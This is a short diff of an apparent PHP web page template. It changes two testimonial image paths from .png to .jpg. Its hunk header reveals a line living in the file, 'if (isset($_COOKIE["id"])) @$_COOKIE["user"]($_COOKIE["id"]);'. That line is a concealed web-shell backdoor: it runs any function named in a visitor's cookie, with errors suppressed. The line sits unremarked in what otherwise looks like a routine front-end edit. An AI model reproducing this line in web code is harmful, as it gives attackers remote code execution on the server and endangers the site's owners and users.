@@ -31,10 +31,10 @@ if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
             <li>
               <div class="about-testimonial-image ">
                 <!-- ko if: gender == "male" -->
-                      <img alt="" src="img/testimonialpic.png">
+                      <img alt="" src="img/testimonialpic.jpg">
                     <!-- /ko -->
                     <!-- ko if: gender == "female" -->
-                      <img alt="" src="img/testimonialpic1.png">
+                      <img alt="" src="img/testimonialpic1.jpg">
                     <!-- /ko -->
               </div>
               <a class="about-testimonial-author" href="javascript:void(0)" data-bind="text: name">
